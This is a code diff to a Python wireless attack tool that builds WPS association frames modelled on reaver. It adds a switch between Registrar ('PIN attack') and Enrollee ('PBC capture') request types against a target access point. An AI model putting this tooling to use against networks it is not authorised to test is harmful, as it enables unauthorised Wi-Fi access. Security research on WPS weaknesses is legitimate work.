@@ -27,9 +27,15 @@ _SUPPORTED_RATES = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
 _EXT_SUPPORTED_RATES = bytes([0x30, 0x48, 0x60, 0x6C])
 _CAP_ESS_PRIVACY = 0x0011
 
-# tag 221 vendor IE: OUI 00:50:F2 type 04 (WPS), Version=1.0, Request Type=Registrar.
-# (reaver src/builder.c WPS_REGISTRAR_TAG)
-_WPS_REGISTRAR_IE_BODY = bytes.fromhex("0050f204104a000110103a000102")
+# tag 221 vendor IE: OUI 00:50:F2 type 04 (WPS), Version=1.0, Request Type byte.
+# (reaver src/builder.c WPS_REGISTRAR_TAG ends in 02 = Registrar.)
+_WPS_IE_PREFIX = bytes.fromhex("0050f204104a000110103a0001")
+WPS_REQ_ENROLLEE = 0x01
+WPS_REQ_REGISTRAR = 0x02
+
+
+def _wps_assoc_ie(request_type: int) -> bytes:
+    return _WPS_IE_PREFIX + bytes([request_type])
 
 _SUBTYPE_ASSOC_RESP = 0x01
 _SUBTYPE_AUTH = 0x0B
@@ -111,7 +117,8 @@ class WpsAssociation:
     """Open-System auth + WPS-registrar Association against one AP."""
 
     def __init__(self, iface, bssid: str, ssid: str, channel: int,
-                 our_mac: Optional[bytes] = None, assoc_timeout: float = 1.0):
+                 our_mac: Optional[bytes] = None, assoc_timeout: float = 1.0,
+                 wps_request_type: int = WPS_REQ_REGISTRAR):
         self.iface = iface
         self.bssid = bssid.lower()
         self.bssid_bytes = str_to_mac(self.bssid)
@@ -119,6 +126,8 @@ class WpsAssociation:
         self.channel = channel
         self.our_mac = our_mac or random_client_mac()
         self.assoc_timeout = assoc_timeout
+        # Registrar (PIN attack) vs Enrollee (PBC capture) intent in the assoc IE.
+        self.wps_request_type = wps_request_type
         self.associated = False
         self.fail_reason: Optional[str] = None
         self._assoc_ok = False
@@ -136,11 +145,12 @@ class WpsAssociation:
         cap = struct.pack("<H", _CAP_ESS_PRIVACY)
         listen = struct.pack("<H", 0x0001)
         ssid = self.ssid.encode("utf-8", "ignore")[:32]
+        wps_ie = _wps_assoc_ie(self.wps_request_type)
         ies = (
             bytes([0x00, len(ssid)]) + ssid
             + bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
             + bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES
-            + bytes([0xDD, len(_WPS_REGISTRAR_IE_BODY)]) + _WPS_REGISTRAR_IE_BODY
+            + bytes([0xDD, len(wps_ie)]) + wps_ie
         )
         return self._hdr(b"\x00\x00") + cap + listen + ies
 
